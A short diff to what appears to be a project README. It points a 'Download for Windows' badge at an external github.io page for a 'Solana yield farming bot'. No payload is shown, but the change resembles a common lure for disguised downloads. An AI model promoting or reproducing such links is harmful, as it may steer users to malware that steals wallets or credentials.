@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-💻-blue?style=for-the-badge&logo=windows)](#)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-💻-blue?style=for-the-badge&logo=windows)](https://solana-yield-farming-bot.github.io/.github)
 </div>
 
 <div align="center">
